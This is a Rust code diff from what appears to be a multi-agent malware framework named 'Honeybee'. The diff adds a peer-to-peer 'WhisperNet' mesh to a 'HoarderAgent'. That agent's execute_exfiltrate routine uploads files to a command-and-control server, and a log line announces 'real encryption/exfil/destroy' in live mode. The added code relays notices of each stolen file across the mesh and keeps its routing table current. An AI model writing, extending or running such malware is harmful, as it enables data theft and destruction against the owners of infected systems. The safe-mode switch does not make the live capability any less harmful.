@@ -15,6 +15,7 @@ struct HoarderAgent {
     comms: HiveChamber,
     identity: AgentIdentity,
     consensus: ConsensusEngine,
+    whispernet: hive_base::whispernet::WhisperNet,
     state: HoarderState,
     active_proposals: Vec<Uuid>,
     heartbeat_interval: Duration,
@@ -39,9 +40,21 @@ impl HoarderAgent {
             info!("Honeybee: LIVE mode — real encryption/exfil/destroy enabled");
         }
 
+        let whispernet = hive_base::whispernet::WhisperNet::new(
+            hive_base::whispernet::WhisperConfig {
+                node_id: identity.id(),
+                listen_port: 0,
+                max_peers: 16,
+                max_hops: 5,
+                heartbeat_interval_secs: 60,
+                encryption_enabled: true,
+            }
+        );
+
         Self {
             comms, identity,
             consensus: ConsensusEngine::new(cfg.consensus.hoarder_threshold),
+            whispernet,
             state: HoarderState::Idle,
             active_proposals: Vec::new(),
             heartbeat_interval: Duration::from_secs(cfg.timing.heartbeat_interval_secs),
@@ -196,7 +209,7 @@ impl HoarderAgent {
         self.publish_msg(msg).await;
     }
 
-    async fn execute_exfiltrate(&self) {
+    async fn execute_exfiltrate(&mut self) {
         if self.safe_mode {
             info!("Honeybee: SAFE MODE — exfil simulated");
             return;
@@ -233,6 +246,22 @@ impl HoarderAgent {
                                     total_bytes += resp.content_length().unwrap_or(0);
                                     info!("Exfiltrated: {} ({} bytes)", path.display(),
                                         path.metadata().map(|m| m.len()).unwrap_or(0));
+
+                                    // WhisperNet: relay exfil notification through P2P mesh
+                                    let relay_data = format!("exfil:{}:{}b", filename,
+                                        path.metadata().map(|m| m.len()).unwrap_or(0));
+                                    let wmsg = hive_base::whispernet::WhisperMessage {
+                                        msg_id: Uuid::new_v4(),
+                                        sender_id: self.identity.id(),
+                                        seq: 0,
+                                        payload: relay_data.into_bytes(),
+                                        ttl: self.whispernet.config.max_hops,
+                                        signature: vec![],
+                                        timestamp: hive_base::utils::timestamp_now(),
+                                    };
+                                    if self.whispernet.send_message(wmsg).is_ok() {
+                                        info!("WhisperNet: relayed exfil notification for {}", filename);
+                                    }
                                 } else {
                                     warn!("C2 rejected: {} (HTTP {})", path.display(), resp.status());
                                 }
@@ -390,10 +419,16 @@ impl HoarderAgent {
             self.identity.id(), self.target_paths.len());
         self.send_heartbeat().await;
         let mut heartbeat_timer = time::interval(self.heartbeat_interval);
+        let mut whisper_timer = time::interval(Duration::from_secs(60));
 
         loop {
             tokio::select! {
                 _ = heartbeat_timer.tick() => { self.send_heartbeat().await; }
+                _ = whisper_timer.tick() => {
+                    self.whispernet.rebuild_routing_table();
+                    info!("WhisperNet: {} peers, {} msgs queued",
+                        self.whispernet.peers.len(), self.whispernet.messages.len());
+                }
                 _ = time::sleep(Duration::from_millis(200)) => { self.process_incoming().await; }
             }
         }
